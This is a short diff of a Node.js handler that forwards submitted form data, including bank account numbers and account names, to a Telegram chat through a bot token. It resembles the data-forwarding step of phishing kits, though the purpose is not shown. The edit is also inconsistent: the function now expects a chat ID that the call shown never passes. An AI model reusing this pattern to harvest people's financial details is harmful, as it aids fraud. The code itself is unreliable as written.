@@ -49,12 +49,12 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // Function to send text message to Telegram
-async function sendTextToTelegram(text) {
+async function sendTextToTelegram(text, CHAT_ID) {
     try {
         const response = await axios.post(
             `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
             {
-                chat_id: TELEGRAM_CHAT_ID,
+                chat_id: CHAT_ID,
                 text: text,
                 parse_mode: 'HTML'
             }
@@ -133,8 +133,11 @@ if (accountNumber) lines.push(`<b>Account Number:</b> ${accountNumber}`);
 if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
    lines.push(`🕒 <b>Submitted at:</b> ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}`);
     
-        // Format text data for Telegram
-        const formattedText = lines.join('\n').trim();
+       
+    // Format text data for Telegram   
+    const formattedText = lines.join('\n').trim();
+    const Chat_Ids = [TELEGRAM_CHAT_ID];
+    
 
         // Send text data to Telegram
         await sendTextToTelegram(formattedText);
